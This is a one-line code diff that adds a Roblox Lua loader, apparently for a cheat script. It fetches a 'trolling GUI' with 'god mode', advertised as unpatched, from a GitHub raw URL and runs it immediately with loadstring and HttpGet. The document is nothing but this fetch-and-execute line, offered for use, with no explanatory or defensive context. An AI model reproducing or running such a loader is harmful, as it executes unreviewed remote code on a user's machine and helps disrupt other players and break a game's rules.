@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FolTakX/OP-Trolling-Gui-god-mode-too-working-not-patched-/main/script_updated.txt"))()
